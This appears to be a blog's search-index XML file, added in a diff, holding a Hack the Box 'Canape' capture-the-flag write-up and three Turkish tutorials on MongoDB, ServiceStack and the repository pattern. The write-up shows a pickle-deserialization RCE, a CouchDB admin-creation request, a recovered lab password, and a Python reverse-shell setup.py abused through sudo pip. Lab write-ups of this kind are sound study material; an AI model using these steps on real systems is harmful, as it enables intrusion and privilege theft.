@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+    <entry>
+      <title><![CDATA[{Hack the Box} \\ Canape Write-Up]]></title>
+      <url>/hack-the-box-canape/</url>
+      <content type="text"><![CDATA[Hi everyone,In this article I will be doing Canape machine on Hack the Box. Lets start..EnumerationFirst we need to know which ports are open. So lets start with port-knockingroot@89e502fff05a:~/pentest/hack-the-box/machines/canape# nmap -sS -sC -sV 10.10.10.70 -o scan-01.txtNmap scan report for 10.10.10.70Host is up (0.076s latency).Not shown: 999 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))| http-git:|   10.10.10.70:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|     Last commit message: final # Please enter the commit message for your changes. Li...|     Remotes:|_      http://git.canape.htb/simpsons.git|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Simpsons Fan Site|_http-trane-info: Problem with XML parsing of /evox/aboutAs you can see there is a git repo, probably contains source code of the app.I wanna look at that web page first.Hmm, CouchDB looks like interesting. At this point I examined all pages on this site. And decided to enumerate the directories on this site, so I ran gobuster, but didn’t find anything. Because if I go to the page which there isn’t on the site, the app gives me 200 ok and shows me a weird random code. Must has a custom error handler.So I decided to take a look at that git repo I found earlier.Edited my /etc/hosts file to access the repo.(By the way, ozzy is my docker container)root@89e502fff05a:~/pentest/hack-the-box/machines/canape# git clone http://git.canape.htb/simpsons.gitCloning into 'simpsons'...remote: Counting objects: 49, done.remote: Compressing objects: 100% (47/47), done.remote: Total 49 (delta 18), reused 0 (delta 0)Unpacking objects: 100% (49/49), done.There it is, __init__.pyOther files are not important. Just some html and js files.Now we can examine the source code of the app. I’m using Visual Studio Code as my text editor.CouchDB running on http://localhost:5984/ noted. Also there is a custom error handler I talked about it. But the important one is cPickle. Its a built-in python module that allows you to serialize &amp; deserialize objects.Here is the full gist of __init__.pyhttps://git.io/fAiTBInside of the check function item = cPickle.loads(data) This line will help us to get RCE (Remote Code Execution).If we post something to http://canape.htb/submit with character and quote parameters that function will create a file in /tmp folder. And write our parameters in that file.outfile = write(char + quote)And than if we post to http://canape.htb/check with parameter id that function will load our data.If our data contains malicious code, also will be executed.Now we can build our payload. But first, character parameter must contain the one of items on the whitelist, don’t forget that.Otherwise we will get 500 Internet Server Error.ExploitationWHITELIST = [ "homer", "marge", "bart", "lisa", "maggie", "moe", "carl", "krusty" ]I wrote a simple script to test it if it works..So I added “homer” at the end of my payload. I added at the begining before but when I tried to execute my test script, it didn’t worked.Ran it and boooom, the command was executed.Than I build a little script to get a reverse-shell.Here is the gist link. https://git.io/fAiTUNow we are in as www-data user. We can start to enumerate from the inside.But first lets quickly upgrade our shell.  CTRL + Zstty raw -echofgFurther EnumerationFirst I want it to check couchdb. I didn’t know how to query that database, so I searched on google.www-data@canape:/$ curl http://localhost:5984{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}www-data@canape:/$ curl http://localhost:5984/_users/_all_docs{"error":"unauthorized","reason":"You are not a server admin."}www-data@canape:/$ curl http://localhost:5984/_all_dbs["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]www-data@canape:/$ curl http://localhost:5984/passwords{"error":"unauthorized","reason":"You are not authorized to access this db."}  Tip: You can prettify that values in vscode by pressing CTRL + K FHmmm thats interesting. There is passwords table, probably with usefull content.I wanna check it out, but it gives me an error that says I’m not authorized.At this point, I know the version of couchdb, so I searched for common exploits and vulnerabilities.And I came across with these:  https://www.exploit-db.com/exploits/44498/https://serverfault.com/questions/742184/couchdb-user-creation-without-authentication-standard-behaviorwww-data@canape:/$ curl -X PUT "http://localhost:5984/_users/org.couchdb.user:pwn" -d '{ "type": "user", "name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'&lt;"name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'{"ok":true,"id":"org.couchdb.user:pwn","rev":"1-2189e39effa7061778a422d5e9318d21"}Yea, that worked, we added an admin user with name and password pwn .www-data@canape:/$ curl http://pwn:pwn@localhost:5984/_users/_all_docs{"total_rows":3,"offset":0,"rows":[{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},{"id":"org.couchdb.user:guest","key":"org.couchdb.user:guest","value":{"rev":"1-76778427e593a7e4a68832b308ed4a5e"}},{"id":"org.couchdb.user:pwn","key":"org.couchdb.user:pwn","value":{"rev":"1-2189e39effa7061778a422d5e9318d21"}}]}Lets have a look at passwords database:www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/_all_docs{"total_rows":4,"offset":0,"rows":[{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}]}At this point, I spent my time to understand that values. And I spent to much time to figure it out.Searched on google how to read those.Than I understand, I didn’t know that base64 values are the actual id values like sql table id’s.  Tip: http://docs.couchdb.org/en/stable/api/index.htmlwww-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}We got a password.Lets cat the /etc/passwd for enumerating users on system....homer:x:1000:1000:homer,,,:/home/homer:/bin/bash...Maybe that password we found belongs to homer ?www-data@canape:/$ su homerPassword:homer@canape:/$We got homer now. user.txt is in this home folder.Privilege EscalationFirst lets check sudo -lhomer@canape:~$ sudo -l[sudo] password for homer:Matching Defaults entries for homer on canape:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser homer may run the following commands on canape:    (root) /usr/bin/pip install *We can install pip packages as root, great.I can grab the flag easily, let me show you.homer@canape:~/.root$ sudo pip install -r /root/root.txtThe directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Collecting xxxxxxxxxxxxxxxxxxxxxxx (from -r /root/root.txt (line 1))Why it worked ? -r flag means take all requipments from given txt file. And I gave it root.txt :smiling_imp: Then pip want it to collect the first line and boooom. (first-line was the flag)And this is other technique for reverse-shell. Create empty folder and name it this little script as setup.py and run sudo pip install .import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("10.10.14.163",3141))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])homer@canape:~/.root$ sudo pip install .The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Processing /home/homer/.rootListening machine:root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nc -lvnp 3141listening on [any] 3141 ...connect to [10.10.14.163] from (UNKNOWN) [10.10.10.70] 39504# iduid=0(root) gid=0(root) groups=0(root)Done, now we are root.It think it was an easy box, but getting the user is a bit hard. Because most of us didn’t knew about couchdb.I used pouchdb and couchdb together one of my projects but even I didn’t knew how to query it using http api ?!This box, pushes us to learn some.See you guys later.]]></content>
+      <categories>
+        
+          <category> write-up </category>
+        
+          <category> hackthebox </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> writeup </tag>
+        
+          <tag> pentest </tag>
+        
+          <tag> hackthebox </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[.Net MongoDB Kullanımı]]></title>
+      <url>/mongodb-in-dotnet/</url>
+      <content type="text"><![CDATA[MongoDBMongoDB, NoSQL kavramıyla ortaya çıkmış document-oriented veri modelini kullanan açık kaynak bir veritabanıdır. Bu yazımda .Net projelerinizde nasıl MongoDB kullanabileceğinizi anlatacağım.  Bu Makalemde MongoDB kurulumuna değinmeyeceğim, kurduğunuzu varsayarak anlatım yapacağım. Bu Makale bulunan kodların proje halini buradan indirebilirsiniz.MongoDB vs SQLAşağıda bazı SQL terimlerinin MongoDB karşılıklarını görüyorsunuz.             SQL      MongoDB                  database      database              table      collection              column      field              row      document      MongoDB Driver kurulumuMongoDB bir çok programlama dilini destekler ve bunlar için ayrı driverları vardır. Bu driverlar uygulamamızın MongoDB ile iletişim kurabilmesini sağlar. Bu yüzden .Net için olan driverı biz NuGet aracılığı ile projemize dahil edeceğiz.Package Manager Console ‘a aşağıdaki kodu yazıp kurabilirsiniz.  Install-Package MongoDB.Driver -Version 2.4.4Ya da projenize sağ tıklayıp Manage NuGet Packages seçeneğinden MongoDB.Driver yazıp arayarak çıkan pakedi kurabilirsiniz. Ben bu makaleyi yazarken kullandığım sürüm 2.4.4 sürümü. Kodlar sürümlere göre farklılık gösterebilir.Repository pattern ile örnek uygulamaBurada entity sınıfımızı projemize eklediğimiz driverdaki attributeleri kullanarak oluşturuyoruz. Id alanlarını [BsonId] diğer alanları ise [BsonElement(..)] attribute ile işaretliyoruz. Id lerimizin tipi ise dikkat ederseniz ObjectId türünden. Bu şekilde field larımızı attribute ler yardımıyla isimlendirmiş olduk. Asenkron bi şekilde repository interface ‘imizi de CRUD işlemlerimiz için hazırlıyoruz.. Context sınıfımızı da yukarıdaki gibi tasarlıyoruz.Burada dikkatinizi çeken IMongoDatabase interface ‘i bizim veritabanımızı temsil ediyor. MongoUrl sınıfını ise bizim connection string ‘imiz üzerinden veritabanı adını alabilmemiz için kullandık.  MongoRepository adında generic bir abstract repository sınıfımızı yukarıdaki gibi hazırlıyoruz. IRepository&lt;T&gt; interface ‘imizi de giydiriyoruz sınıfımıza. IMongoCollection&lt;T&gt; Başta gösterdiğim tablodaki gibi collection, SQL karşılığı ile bizim tablolarımızdır diyebiliriz. Burada bir de AddNewAsync methodumuzu görüyorsunuz. Collection property ‘mizin InsertOneAsync methodu ile veritabanımıza ekleme yapıyoruz.  Burada açıkçası pek fazla açıklama yapmaya gerek olmadığını düşünüyorum. MongoRespository sınıfımızın diğer methodları buradakiler. Sorgulama yaparken (GetByX.. methodlarımızda) filtreleme yapabilmek için Builder sınıfından yararlanıyoruz. Ya da linq methodları ile de yapabilirsiniz bunu tabii.Burada update işleminde linq kullandık. UserRepository ‘mizi de oluşturduk. _dataContext.Database.GetCollection&lt;User&gt;("users"); Burada tırnak içinde “users” yazdığım yere siz tabiiki kendi koleksiyonunuza vermek istediğiniz adı gireceksiniz.Buraya kadar tamam. Bir de pratik olsun diye UnitOfWork yapalım hadi.   Ve aşağıda da oluşturduğumuz sınıflarımızı kullanarak CRUD işlemlerimizi gerçekleştirdiğimiz bir test sınıfımız var.Bir sonraki yazıda görüşmek üzere. ]]></content>
+      <categories>
+        
+          <category> database </category>
+        
+          <category> mongodb </category>
+        
+          <category> repository-pattern </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> repositorypattern </tag>
+        
+          <tag> mongodb </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[ServiceStack ile web servis geliştirme]]></title>
+      <url>/service-stack/</url>
+      <content type="text"><![CDATA[Nedir bu ServiceStack ?WCF ve Web API ye alternatif olarak cross-platform olarak kullanabileceğimiz open-source bir web service framework. Eğer .Net Framework çatısı altında çalışıyorsanız WCF kullanabilirsiniz fakat web servislerinizi Windows dışındaki platformlara da dağıtmak istiyorsanız ServiceStack ideal bir seçenektir.  WCF client ve server arasındaki iletişimi sağlayabilmek için data contracts (veri sözleşmeleri) kullanır.ServiceStack bu bakımdan biraz da WCF ‘e benzer.Daha fazla bilgi için: servicestack.netNeden ServiceStack ?  Kolay olması  Hızlı olması  Bizi karmaşık XML configrasyonlarıyla uğraştırmaması  En önemlisi de cross-platform bir hizmet verebilmemizi sağlıyor olmasıgibi avantajları olduğu için tercih edilir.ServiceStack Any, GET, POST, DELETE, PUT gibi eylemleri destekler. Any hem GET hem de POST istekleri tarafından çağrılabileceği anlamına gelir.  ServiceStack web servisimizi RESTful web servise dönüştürmek için Web request tanımlarken sınıfımızı [Route(...)] attribute ile uygun şekilde işaretlememiz yeterli.Ufak bir örnek ile gösterelim. NuGet package manager ‘da  ServiceStack framework ‘unu buluyoruz ve projemize ekliyoruz.Burada basitçe Name parametresi alan bir HelloService oluşturduk. Geriye gördüğünüz üzere "Hello, $Name" şeklinde parametreyi döndürüyor. HelloRequest sınıfına neden IReturn&lt;HelloResponse&gt; arayüzünü giydirdiğimizi birazdan açıklayacağım.AppHost ‘umuzu AppSelfHostBase sınıfından türetiyoruz. Ve constructor ‘ında ilgili parametreleri veriyoruz.Hostumuzu bu şekilde oluşturup başlatıyoruz.Test projemize aynı şekilde NuGet package manager ‘dan bu kez ServiceStack.HttpClient referansını ekliyoruz.HelloRequest sınıfına IReturn&lt;HelloResponse&gt; arayüzünü giydirmeseydik kodda yorum satırı olarak geçen:  string response = client.Get(new HelloRequest { Name = "SERKAN" }).Result; şeklinde bir kullanım yapamazdık.  Çünki client.Get() fonksiyonun aldığı parametrelerden biri IRequest&lt;T&gt;. Bu yazımızda buraya kadar. Detaylı dokümantasyon için docs.servicestack.net adresine göz atabilirsin. ]]></content>
+      <categories>
+        
+          <category> web-services </category>
+        
+          <category> rest-api </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> servicestack webservices </tag>
+        
+          <tag> restfullservice </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+    <entry>
+      <title><![CDATA[Repository pattern ve tipik hatalar]]></title>
+      <url>/repository-pattern/</url>
+      <content type="text"><![CDATA[Repository pattern bir soyutlamadır. Amaç karışıklığı azaltarak kodun geri kalanını kalıcı kılmaktır.Faydaları !  Unit testler yazmayı kolaylaştırır.  Kodun bakım ve yönetimi kolaylaşır.  CRUD (Create, Read, Update, Delete) işlemlerimizi hızlıca gerçekleştirebiliriz.Nasıl repository oluşturulur ?Repository pattern ‘ı doğru bir şekilde uygulayabilmek için izlemeniz gereken tek bir kural var.  Repository sınıfınıza, ihtiyaç duyana kadar hiç bir şey eklemeyin !Geliştiricilerin bir çoğu generic bir repository oluturup, içine ihtiyaç duyabilecekleri tüm fonksiyonları da ekleyerek bunu bir base class olarak kullanırlar. Bu yanlıştır.Unit of WorkUnit of work design pattern ‘ı genellikle repository pattern ile birlikte kullanılır.Adından da anlaşılacağı gibi veritabanı işlemlerimizi tek bir kanaldan yürütmemizi sağlar. Yapılan işlemlerin veritabanına toplu halde kaydedilmesi, herhangi bir hata olması durumunda rollback (geri alınması) ya da transaction iptali gibi işlemleri sağlayabiliriz.UygulamaKüçük bir örnek ile başlayalım.Biraz da özelleştirelim.Burada görüldüğü gibi sadece ihtiyacınız olan fonksiyonları oluşturun.Entity FrameworkBase class (taban sınıf)Oluşturduğumuz taban sınıfımızı daha sonra repository sınıfımıza implement ediyoruz.return ederken ToList(), FirstOrDefault() vb. çağrılıncaya kadar sorgu veritabanında yürütülemez.Kullanmayı unutmayın !Entity Framework için Unit of WorkFinalTipik hatalarLinq methodlarınızı dışarı açmayınEğer linq methodlarınızı açığa vurursanız yani dışarıya açarsanız (sızıntı) repository pattern ‘ı amacına uygun kullanamamış olursunuz. Sızıntılı bir soyutlama elde edersiniz.Genellikle IQueryable&lt;T&gt; ile.Repository pattern yazının en başında da dediğimiz gibi soyutlamaya (abstraction) dayanır.Bunu yapmayın:  Bu repository sınıfları hiç bir amaca hizmet etmiyor.Lazy-loading öğreninEğer bilmiyorsanız Google]]></content>
+      <categories>
+        
+          <category> design-patterns </category>
+        
+          <category> .net </category>
+        
+          <category> repository-pattern </category>
+        
+          <category> unit-of-work </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> repositorypattern </tag>
+        
+          <tag> entityframework </tag>
+        
+          <tag> unitofwork </tag>
+        
+          <tag> designpatterns </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
+</search>
